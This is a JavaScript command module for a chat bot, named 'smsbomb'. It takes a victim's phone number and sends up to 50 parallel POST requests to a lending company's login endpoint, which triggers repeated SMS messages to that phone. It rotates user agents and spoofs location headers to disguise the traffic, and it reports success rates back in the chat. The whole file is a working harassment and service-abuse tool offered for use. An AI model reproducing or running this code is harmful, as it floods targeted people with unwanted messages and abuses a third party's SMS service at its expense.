const axios = require('axios');
const random = require('random');

module.exports.config = {
  name: "smsbomb",
  version: "3.0.0",
  role: 2, // Bot owner only
  credits: "selov",
  description: "Send SMS bomb to phone number",
  commandCategory: "utility",
  usages: "/smsbomb <phone> [threads]",
  cooldowns: 30
};

module.exports.run = async function ({ api, event, args }) {
  const { threadID, messageID, senderID } = event;

  // Helper function inside run
  const sendSingleRequest = async (phone, successes, failures) => {
    const coordinates = [
      { lat: '14.5995', long: '120.9842' },
      { lat: '14.6760', long: '121.0437' },
      { lat: '14.8648', long: '121.0418' }
    ];

    const userAgents = [
      'okhttp/4.12.0',
      'okhttp/4.9.2',
      'Dart/3.6 (dart:io)'
    ];

    try {
      const coord = random.pick(coordinates);
      const agent = random.pick(userAgents);

      const data = {
        domain: phone,
        cat: 'login',
        previous: false,
        financial: 'efe35521e51f924efcad5d61d61072a9'
      };

      const headers = {
        'User-Agent': agent,
        'Content-Type': 'application/json; charset=utf-8',
        'x-latitude': coord.lat,
        'x-longitude': coord.long
      };

      await axios.post(
        'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
        data,
        { headers, timeout: 10000 }
      );
      
      return { success: true };
    } catch (err) {
      return { success: false };
    }
  };

  try {
    // Parse arguments
    const phone = args[0];
    const threads = args[1] ? parseInt(args[1]) : 30;

    // Validate phone number
    if (!phone) {
      return api.sendMessage(
        "❌ Please provide a phone number.\n\nUsage: /smsbomb <phone> [threads]\nExample: /smsbomb 09450807xxx 30",
        threadID,
        messageID
      );
    }

    // Validate threads number
    if (isNaN(threads) || threads < 1 || threads > 50) {
      return api.sendMessage(
        "❌ Threads must be between 1-50.",
        threadID,
        messageID
      );
    }

    // Send initial message
    const waiting = await api.sendMessage(
      `📱 **SMS BOMB STARTED**\n━━━━━━━━━━━━━━━━\n📞 Phone: ${phone}\n⚡ Threads: ${threads}\n⏳ Please wait...`,
      threadID
    );

    // Track results
    let successCount = 0;
    let failCount = 0;
    const totalThreads = threads;

    // Create progress update
    const progressMsg = await api.sendMessage(
      `📊 Progress: 0/${totalThreads} completed`,
      threadID
    );

    // Execute all threads
    const promises = [];
    for (let i = 0; i < totalThreads; i++) {
      promises.push(
        sendSingleRequest(phone)
          .then(result => {
            if (result.success) {
              successCount++;
            } else {
              failCount++;
            }
            
            // Update progress every 5 threads
            if ((successCount + failCount) % 5 === 0 || successCount + failCount === totalThreads) {
              api.editMessage(
                `📊 Progress: ${successCount + failCount}/${totalThreads} completed\n✅ Success: ${successCount}\n❌ Failed: ${failCount}`,
                progressMsg.messageID
              );
            }
          })
      );
    }

    // Wait for all threads to complete
    await Promise.allSettled(promises);

    // Calculate success rate
    const successRate = ((successCount / totalThreads) * 100).toFixed(2);

    // Prepare final result message
    const resultMsg = 
      `📱 **SMS BOMB COMPLETE**\n━━━━━━━━━━━━━━━━\n` +
      `📞 **Phone:** ${phone}\n` +
      `⚡ **Threads:** ${totalThreads}\n` +
      `✅ **Success:** ${successCount}\n` +
      `❌ **Failed:** ${failCount}\n` +
      `📊 **Success Rate:** ${successRate}%\n` +
      `━━━━━━━━━━━━━━━━\n` +
      `💬 Request completed!`;

    // Delete progress message
    api.unsendMessage(progressMsg.messageID);

    // Update waiting message with results
    await api.editMessage(resultMsg, waiting.messageID);

  } catch (err) {
    console.error("SMS Command Error:", err);
    api.sendMessage(`❌ Error: ${err.message}`, threadID, messageID);
  }
};
